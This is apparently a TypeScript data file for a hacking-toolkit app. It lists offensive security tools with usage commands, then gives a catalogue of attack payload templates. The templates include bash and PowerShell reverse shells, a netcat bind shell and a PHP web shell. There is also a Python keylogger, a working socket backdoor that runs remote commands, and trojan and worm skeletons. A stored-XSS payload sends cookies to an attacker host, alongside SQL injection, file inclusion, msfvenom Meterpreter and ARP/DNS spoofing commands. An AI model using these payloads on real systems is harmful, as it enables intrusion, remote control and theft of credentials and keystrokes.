export interface Tool {
  id: string;
  title: string;
  description: string;
  category: string;
  difficulty: 'Beginner' | 'Intermediate' | 'Advanced';
  usage: string;
  explanation: string;
  platform?: string;
}

export const toolkitData: Tool[] = [
  // Network Scanning & Reconnaissance
  {
    id: "nmap",
    title: "Nmap Port Scanner",
    description: "Network exploration tool and security/port scanner for discovering hosts and services on a network.",
    category: "Network Scanning",
    difficulty: "Beginner",
    usage: "nmap -sS -O target_ip",
    explanation: "Nmap (Network Mapper) is a free and open-source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics."
  },
  {
    id: "masscan",
    title: "Masscan High-Speed Scanner",
    description: "Internet-scale port scanner capable of scanning the entire Internet in under 6 minutes.",
    category: "Network Scanning",
    difficulty: "Intermediate",
    usage: "masscan -p1-65535 10.0.0.0/8 --rate=1000",
    explanation: "Masscan is an Internet-scale port scanner. It can scan the entire Internet in under 6 minutes, transmitting 10 million packets per second. It produces results similar to nmap, the most famous port scanner. Internally, it operates more like scanrand, unicornscan, and ZMap, using asynchronous transmission."
  },
  {
    id: "amass",
    title: "Amass Subdomain Enumeration",
    description: "In-depth attack surface mapping and asset discovery tool for subdomain enumeration.",
    category: "Reconnaissance",
    difficulty: "Intermediate",
    usage: "amass enum -d example.com",
    explanation: "The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques. It's designed to help information security professionals during reconnaissance phases of penetration tests."
  },
  {
    id: "subfinder",
    title: "Subfinder Subdomain Discovery",
    description: "Fast passive subdomain enumeration tool using various online sources.",
    category: "Reconnaissance",
    difficulty: "Beginner",
    usage: "subfinder -d example.com",
    explanation: "Subfinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources. It has a simple modular architecture and is optimized for speed. subfinder is built for doing one thing only - passive subdomain enumeration, and it does that very well."
  },

  // Web Application Testing
  {
    id: "burpsuite",
    title: "Burp Suite Web Security",
    description: "Integrated platform for performing security testing of web applications.",
    category: "Web Application Testing",
    difficulty: "Intermediate",
    usage: "burpsuite",
    explanation: "Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application's attack surface, through to finding and exploiting security vulnerabilities."
  },
  {
    id: "sqlmap",
    title: "SQLMap SQL Injection Tool",
    description: "Automatic SQL injection and database takeover tool for detecting and exploiting SQL injection flaws.",
    category: "Web Application Testing",
    difficulty: "Intermediate",
    usage: "sqlmap -u 'http://target.com/page?id=1'",
    explanation: "SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine and many features for penetration testers."
  },
  {
    id: "gobuster",
    title: "Gobuster Directory Brute-forcer",
    description: "Tool used to brute-force URIs, DNS subdomains, and virtual host names.",
    category: "Web Application Testing",
    difficulty: "Beginner",
    usage: "gobuster dir -u http://target.com -w wordlist.txt",
    explanation: "Gobuster is a tool used to brute-force URIs (directories and files) in web sites, DNS subdomains (with wildcard support), and virtual host names on target web servers. It's written in Go and is designed to be fast and efficient."
  },
  {
    id: "dirbuster",
    title: "DirBuster Directory Scanner",
    description: "Multi-threaded java application designed to brute force directories and files names on web/application servers.",
    category: "Web Application Testing",
    difficulty: "Beginner",
    usage: "dirbuster -u http://target.com -l wordlist.txt",
    explanation: "DirBuster is a multi threaded java application designed to brute force directories and files names on web/application servers. Often is the case now of what looks like a web server in a state of default installation is actually not, and has pages and applications hidden within."
  },
  {
    id: "nikto",
    title: "Nikto Web Scanner",
    description: "Web server scanner that tests for dangerous files, outdated programs, and server configuration issues.",
    category: "Web Application Testing",
    difficulty: "Beginner",
    usage: "nikto -h http://target.com",
    explanation: "Nikto is an Open Source web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers."
  },

  // Password Attacks & Hash Cracking
  {
    id: "hashcat",
    title: "Hashcat Advanced Password Recovery",
    description: "World's fastest and most advanced password recovery utility supporting over 300 hash algorithms.",
    category: "Password Attacks",
    difficulty: "Advanced",
    usage: "hashcat -m 0 -a 0 hashes.txt wordlist.txt",
    explanation: "Hashcat is the world's fastest and most advanced password recovery utility, supporting five unique modes of attack for over 300 highly-optimized hashing algorithms. hashcat currently supports CPUs, GPUs, and other hardware accelerators on Linux, Windows, and macOS."
  },
  {
    id: "johntheripper",
    title: "John the Ripper",
    description: "Fast password cracker for detecting weak Unix passwords and other hash types.",
    category: "Password Attacks",
    difficulty: "Beginner",
    usage: "john --wordlist=passwords.txt hashes.txt",
    explanation: "John the Ripper is a fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS. Its primary purpose is to detect weak Unix passwords, but it supports hashes for many other platforms as well."
  },
  {
    id: "hydra",
    title: "Hydra Password Cracker",
    description: "Fast network logon cracker supporting many different services and protocols.",
    category: "Password Attacks",
    difficulty: "Intermediate",
    usage: "hydra -l admin -P passwords.txt ssh://target_ip",
    explanation: "Hydra is a parallelized login cracker which supports numerous protocols to attack. It's very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely."
  },

  // Wireless Security
  {
    id: "aircrack",
    title: "Aircrack-ng WiFi Security",
    description: "Complete suite of tools to assess WiFi network security and crack WEP/WPA passwords.",
    category: "Wireless Security",
    difficulty: "Advanced",
    usage: "aircrack-ng -w wordlist.txt capture.cap",
    explanation: "Aircrack-ng is a complete suite of tools to assess WiFi network security. It focuses on different areas of WiFi security: monitoring, attacking, testing, and cracking (WEP and WPA PSK)."
  },
  {
    id: "wifite",
    title: "Wifite Automated WiFi Auditor",
    description: "Automated wireless auditor designed to use all known methods for retrieving the password of a wireless access point.",
    category: "Wireless Security",
    difficulty: "Intermediate",
    usage: "wifite --kill",
    explanation: "Wifite is designed to use all known methods for retrieving the password of a wireless access point (router). These methods include: WPS: The Offline Pixie-Dust attack, The Online Brute-Force PIN attack, WPA: The WPA Handshake Capture + offline crack, WEP: Various known attacks against WEP."
  },
  {
    id: "kismet",
    title: "Kismet Wireless IDS",
    description: "Wireless network detector, sniffer, and intrusion detection system.",
    category: "Wireless Security",
    difficulty: "Advanced",
    usage: "kismet",
    explanation: "Kismet is a wireless network detector, sniffer, and intrusion detection system. It works with any wireless card that supports raw monitoring mode and can sniff 802.11a, 802.11b, 802.11g, and 802.11n traffic."
  },
  {
    id: "reaver",
    title: "Reaver WPS Attack Tool",
    description: "Tool to perform brute force attack against WPS registrar PINs to recover WPA/WPA2 passphrases.",
    category: "Wireless Security",
    difficulty: "Advanced",
    usage: "reaver -i wlan0 -b <target BSSID> -vv",
    explanation: "Reaver implements a brute force attack against Wifi Protected Setup (WPS) registrar PINs in order to recover WPA/WPA2 passphrases."
  },
  {
    id: "bettercap",
    title: "Bettercap Network Attack Framework",
    description: "Powerful, flexible and portable tool to perform various MITM attacks against a network.",
    category: "Network Attack",
    difficulty: "Advanced",
    usage: "bettercap -iface eth0",
    explanation: "Bettercap is a powerful, flexible and portable tool created to perform various types of MITM attacks against a network, manipulate HTTP, HTTPS and TCP traffic in real-time, sniff for credentials and much more."
  },
  {
    id: "nmap-nse",
    title: "Nmap NSE Scripts",
    description: "Nmap scripting engine for advanced network discovery and vulnerability detection.",
    category: "Network Attack",
    difficulty: "Advanced",
    usage: "nmap --script vuln <target>",
    explanation: "Nmap NSE (Nmap Scripting Engine) allows users to write scripts to automate a wide variety of networking tasks, including advanced network discovery and vulnerability detection."
  },
  {
    id: "data-analyzer",
    title: "Network Data Analyzer",
    description: "Tool for analyzing network traffic data and logs for insights.",
    category: "Data Analysis",
    difficulty: "Intermediate",
    usage: "python analyze_network.py capture.pcap",
    explanation: "This tool helps analyze network traffic data and logs to extract meaningful insights, detect anomalies, and assist in forensic investigations."
  },
  {
    id: "zeek",
    title: "Zeek Network Security Monitor",
    description: "Powerful network analysis framework focused on security monitoring.",
    category: "Data Analysis",
    difficulty: "Advanced",
    usage: "zeek -r capture.pcap",
    explanation: "Zeek (formerly Bro) is a powerful network analysis framework that is much different from the typical IDS. It provides a comprehensive platform for network traffic analysis and security monitoring."
  },
  {
    id: "snort",
    title: "Snort Intrusion Detection System",
    description: "Open source network intrusion detection and prevention system.",
    category: "Network Attack",
    difficulty: "Advanced",
    usage: "snort -c /etc/snort/snort.conf -i eth0",
    explanation: "Snort is an open source network intrusion detection and prevention system capable of performing real-time traffic analysis and packet logging on IP networks."
  },

   // OSINT Tools
   {
     id: "sherlock",
     title: "Sherlock Username Hunter",
     description: "Hunt down social media accounts by username across social networks.",
     category: "OSINT",
     difficulty: "Beginner",
     usage: "sherlock username",
     explanation: "Sherlock hunts down social media accounts by username across social networks. It's designed to quickly find usernames across many social networks and can be used for OSINT investigations and digital forensics."
   },
  {
    id: "theHarvester",
    title: "theHarvester Email Gatherer",
    description: "Gather emails, subdomains, hosts, employee names, open ports and banners from different public sources.",
    category: "OSINT",
    difficulty: "Beginner",
    usage: "theHarvester -d example.com -l 500 -b google",
    explanation: "theHarvester is a very simple to use, yet powerful and effective tool designed to be used in the early stages of a penetration test or red team engagement. Use it for open source intelligence (OSINT) gathering to help determine a company's external threat landscape."
  },
  {
    id: "maltego",
    title: "Maltego OSINT Platform",
    description: "Interactive data mining tool that renders directed graphs for link analysis.",
    category: "OSINT",
    difficulty: "Advanced",
    usage: "maltego",
    explanation: "Maltego is an interactive data mining tool that renders directed graphs for link analysis. The tool is used in online investigations for finding relationships between pieces of information from various sources located on the Internet."
  },
  {
    id: "spiderfoot",
    title: "SpiderFoot OSINT Automation",
    description: "Open source intelligence automation tool that integrates with just about every data source available.",
    category: "OSINT",
    difficulty: "Intermediate",
    usage: "spiderfoot -s target.com",
    explanation: "SpiderFoot is an open source intelligence (OSINT) automation tool. It integrates with just about every data source available and utilises a range of methods for data analysis, making that data easy to navigate."
  },

  // Mobile Security
  {
    id: "msfvenom",
    title: "MSFvenom Payload Generator",
    description: "Payload generator and encoder for creating malicious payloads for various platforms including Android and iOS.",
    category: "Mobile Security",
    difficulty: "Advanced",
    usage: "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o payload.apk",
    explanation: "MSFvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. It's used to generate payloads for various platforms including mobile devices.",
    platform: "Android/iOS"
  },
  {
    id: "apktool",
    title: "APKTool Android Reverse Engineering",
    description: "Tool for reverse engineering Android apk files for analysis and modification.",
    category: "Mobile Security",
    difficulty: "Intermediate",
    usage: "apktool d app.apk",
    explanation: "A tool for reverse engineering 3rd party, closed, binary Android apps. It can decode resources to nearly original form and rebuild them after making some modifications.",
    platform: "Android"
  },
  {
    id: "drozer",
    title: "Drozer Android Security Testing",
    description: "Security testing framework for Android that allows you to search for security vulnerabilities in apps and devices.",
    category: "Mobile Security",
    difficulty: "Advanced",
    usage: "drozer console connect",
    explanation: "drozer allows you to search for security vulnerabilities in apps and devices by assuming the role of an app and interacting with the Dalvik VM, other apps' IPC endpoints and the underlying OS.",
    platform: "Android"
  },

  // AI-Powered Tools
  {
    id: "gpt_researcher",
    title: "GPT Researcher OSINT",
    description: "AI-powered research assistant for comprehensive OSINT investigations and report generation.",
    category: "AI Tools",
    difficulty: "Intermediate",
    usage: "gpt-researcher --query 'target investigation'",
    explanation: "GPT Researcher is an AI-powered research assistant designed to conduct comprehensive OSINT investigations. It can gather information from multiple sources, analyze data, and generate detailed reports automatically."
  },
  {
    id: "pentest_gpt",
    title: "PentestGPT AI Assistant",
    description: "AI-powered penetration testing assistant that helps with vulnerability assessment and exploit development.",
    category: "AI Tools",
    difficulty: "Advanced",
    usage: "pentestgpt --target target.com",
    explanation: "PentestGPT is an AI assistant designed to help penetration testers and security researchers. It can assist with vulnerability assessment, exploit development, and security analysis using advanced AI capabilities."
  },
  {
    id: "nuclei_ai",
    title: "Nuclei AI-Enhanced Scanner",
    description: "Fast and customizable vulnerability scanner with AI-powered template generation.",
    category: "AI Tools",
    difficulty: "Intermediate",
    usage: "nuclei -u target.com -ai-enhance",
    explanation: "Nuclei is used to send requests across targets based on a template, leading to zero false positives. The AI enhancement helps generate custom templates and improve detection accuracy."
  },

  // Exploitation Frameworks
  {
    id: "metasploit",
    title: "Metasploit Framework",
    description: "Penetration testing framework that provides information about security vulnerabilities.",
    category: "Exploitation",
    difficulty: "Advanced",
    usage: "msfconsole",
    explanation: "The Metasploit Framework is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development."
  },
  {
    id: "cobaltstrike",
    title: "Cobalt Strike Simulation",
    description: "Adversary simulation and red team operations platform for advanced persistent threat emulation.",
    category: "Exploitation",
    difficulty: "Advanced",
    usage: "cobaltstrike",
    explanation: "Cobalt Strike is software for Adversary Simulations and Red Team Operations. It's designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors."
  },

  // Network Analysis
  {
    id: "wireshark",
    title: "Wireshark Packet Analyzer",
    description: "Network protocol analyzer that captures and interactively browses network traffic.",
    category: "Network Analysis",
    difficulty: "Intermediate",
    usage: "wireshark -i eth0",
    explanation: "Wireshark is a network packet analyzer that captures network packets and displays packet data as detailed as possible. It's used for network troubleshooting, analysis, software and communications protocol development, and education."
  },
  {
    id: "tcpdump",
    title: "TCPDump Packet Capture",
    description: "Command-line packet analyzer for capturing and analyzing network traffic.",
    category: "Network Analysis",
    difficulty: "Beginner",
    usage: "tcpdump -i eth0 -w capture.pcap",
    explanation: "tcpdump is a data-network packet analyzer computer program that runs under a command line interface. It allows the user to display TCP/IP and other packets being transmitted or received over a network."
  },

  // Python Security Tools
  {
    id: "scapy",
    title: "Scapy Packet Manipulation",
    description: "Python-based interactive packet manipulation program and library for network analysis.",
    category: "Python Tools",
    difficulty: "Advanced",
    usage: "scapy",
    explanation: "Scapy is a Python program that enables the user to send, sniff and dissect and forge network packets. This capability allows construction of tools that can probe, scan or attack networks."
  },
  {
    id: "impacket",
    title: "Impacket Network Protocols",
    description: "Collection of Python classes for working with network protocols for penetration testing.",
    category: "Python Tools",
    difficulty: "Advanced",
    usage: "python3 psexec.py domain/user@target",
    explanation: "Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself."
  }
];

export const payloadTypes = [
  // Basic Shells
  {
    id: "reverse_shell",
    name: "Reverse Shell",
    description: "Creates a connection back to the attacker's machine",
    template: "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
    category: "Basic Shells"
  },
  {
    id: "bind_shell",
    name: "Bind Shell",
    description: "Opens a port on the target machine for connection",
    template: "nc -lvp {PORT} -e /bin/bash",
    category: "Basic Shells"
  },
  {
    id: "php_webshell",
    name: "PHP Web Shell",
    description: "PHP script for web-based command execution",
    template: "<?php system($_GET['cmd']); ?>",
    category: "Web Shells"
  },
  {
    id: "powershell_reverse",
    name: "PowerShell Reverse Shell",
    description: "Windows PowerShell reverse shell payload",
    template: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{IP}',{PORT})",
    category: "Windows Payloads"
  },

  // Malware Payloads
  {
    id: "keylogger",
    name: "Python Keylogger",
    description: "Educational keylogger for monitoring keyboard input",
    template: `import pynput
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()`,
    category: "Malware"
  },
  {
    id: "backdoor",
    name: "Python Backdoor",
    description: "Simple backdoor for remote access (educational)",
    template: `import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{IP}', {PORT}))

while True:
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()`,
    category: "Malware"
  },
  {
    id: "trojan_horse",
    name: "Trojan Horse Template",
    description: "Educational trojan horse structure",
    template: `# Legitimate-looking application
def legitimate_function():
    print("Running legitimate application...")
    # Legitimate code here
    
# Hidden malicious payload
def hidden_payload():
    import os
    import socket
    # Connect to C&C server at {IP}:{PORT}
    # Execute malicious commands
    pass

if __name__ == "__main__":
    legitimate_function()
    hidden_payload()  # Hidden execution`,
    category: "Malware"
  },
  {
    id: "worm",
    name: "Network Worm Template",
    description: "Educational network worm structure",
    template: `import socket
import threading
import subprocess

def scan_network():
    # Scan for vulnerable hosts
    for i in range(1, 255):
        target = f"192.168.1.{i}"
        # Attempt to exploit vulnerability
        
def replicate():
    # Self-replication mechanism
    # Copy to target: {IP}:{PORT}
    pass

def payload():
    # Execute malicious payload
    pass

if __name__ == "__main__":
    scan_network()
    replicate()
    payload()`,
    category: "Malware"
  },

  // Web Exploitation
  {
    id: "xss_reflected",
    name: "Reflected XSS",
    description: "Reflected Cross-Site Scripting payload",
    template: `<script>alert('XSS Vulnerability Found!');</script>`,
    category: "Web Exploitation"
  },
  {
    id: "xss_stored",
    name: "Stored XSS",
    description: "Stored Cross-Site Scripting payload",
    template: `<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://{IP}:{PORT}/steal?cookie=' + document.cookie, true);
xhr.send();
</script>`,
    category: "Web Exploitation"
  },
  {
    id: "xss_burpsuite",
    name: "Burp Suite XSS Script",
    description: "XSS payload script for Burp Suite testing",
    template: `<script>alert(document.cookie);</script>`,
    category: "Web Exploitation"
  },
  {
    id: "sql_injection",
    name: "SQL Injection",
    description: "Basic SQL injection payload",
    template: `' OR '1'='1' --`,
    category: "Web Exploitation"
  },
  {
    id: "sql_union",
    name: "SQL Union Injection",
    description: "Union-based SQL injection payload",
    template: `' UNION SELECT 1,2,3,database(),user(),version() --`,
    category: "Web Exploitation"
  },
  {
    id: "sql_burpsuite",
    name: "Burp Suite SQL Injection Script",
    description: "SQL injection script for Burp Suite testing",
    template: `" OR 1=1;--`,
    category: "Web Exploitation"
  },
  {
    id: "lfi_payload",
    name: "Local File Inclusion",
    description: "LFI payload for file disclosure",
    template: `../../../etc/passwd`,
    category: "Web Exploitation"
  },
  {
    id: "rfi_payload",
    name: "Remote File Inclusion",
    description: "RFI payload for remote code execution",
    template: `http://{IP}:{PORT}/malicious.php`,
    category: "Web Exploitation"
  },

  // Mobile Payloads
  {
    id: "android_reverse",
    name: "Android Reverse Shell",
    description: "Android reverse shell payload using MSFvenom",
    template: `msfvenom -p android/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -o payload.apk`,
    category: "Mobile Payloads"
  },
  {
    id: "android_bind",
    name: "Android Bind Shell",
    description: "Android bind shell payload",
    template: `msfvenom -p android/meterpreter/bind_tcp LPORT={PORT} -o bind_payload.apk`,
    category: "Mobile Payloads"
  },
  {
    id: "ios_payload",
    name: "iOS Payload",
    description: "iOS payload for jailbroken devices",
    template: `msfvenom -p osx/x86/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f macho -o payload.macho`,
    category: "Mobile Payloads"
  },

  // Advanced Payloads
  {
    id: "meterpreter",
    name: "Meterpreter Payload",
    description: "Advanced Meterpreter reverse shell",
    template: `msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o payload.exe`,
    category: "Advanced"
  },
  {
    id: "cobalt_beacon",
    name: "Cobalt Strike Beacon",
    description: "Cobalt Strike beacon payload template",
    template: `# Cobalt Strike Beacon Configuration
set LHOST {IP}
set LPORT {PORT}
generate beacon.exe`,
    category: "Advanced"
  },
  {
    id: "empire_agent",
    name: "PowerShell Empire Agent",
    description: "PowerShell Empire agent payload",
    template: `powershell -NoP -sta -NonI -W Hidden -Enc <base64_encoded_empire_stager>`,
    category: "Advanced"
  },

  // Wordlist Generators
  {
    id: "custom_wordlist",
    name: "Custom Wordlist Generator",
    description: "Generate custom wordlists for password attacks",
    template: `# Custom wordlist generation
crunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -o wordlist.txt`,
    category: "Wordlists"
  },
  {
    id: "cewl_wordlist",
    name: "CeWL Website Wordlist",
    description: "Generate wordlist from website content",
    template: `cewl -d 2 -m 5 -w wordlist.txt http://target.com`,
    category: "Wordlists"
  },

  // Network Payloads
  {
    id: "arp_spoof",
    name: "ARP Spoofing",
    description: "ARP spoofing attack payload",
    template: `ettercap -T -M arp:remote /{IP}// /{GATEWAY}//`,
    category: "Network"
  },
  {
    id: "dns_spoof",
    name: "DNS Spoofing",
    description: "DNS spoofing attack payload",
    template: `ettercap -T -M arp:remote -P dns_spoof /{IP}// /{GATEWAY}//`,
    category: "Network"
  }
];

export const wordlistTypes = [
  {
    id: "rockyou",
    name: "RockYou Wordlist",
    description: "Popular password wordlist from RockYou breach",
    size: "14M passwords"
  },
  {
    id: "seclist_passwords",
    name: "SecLists Passwords",
    description: "Comprehensive password lists from SecLists",
    size: "Various sizes"
  },
  {
    id: "custom_generated",
    name: "Custom Generated",
    description: "Generate custom wordlists based on target information",
    size: "Variable"
  },
  {
    id: "leaked_databases",
    name: "Leaked Database Passwords",
    description: "Passwords from various data breaches",
    size: "Millions of passwords"
  }
];
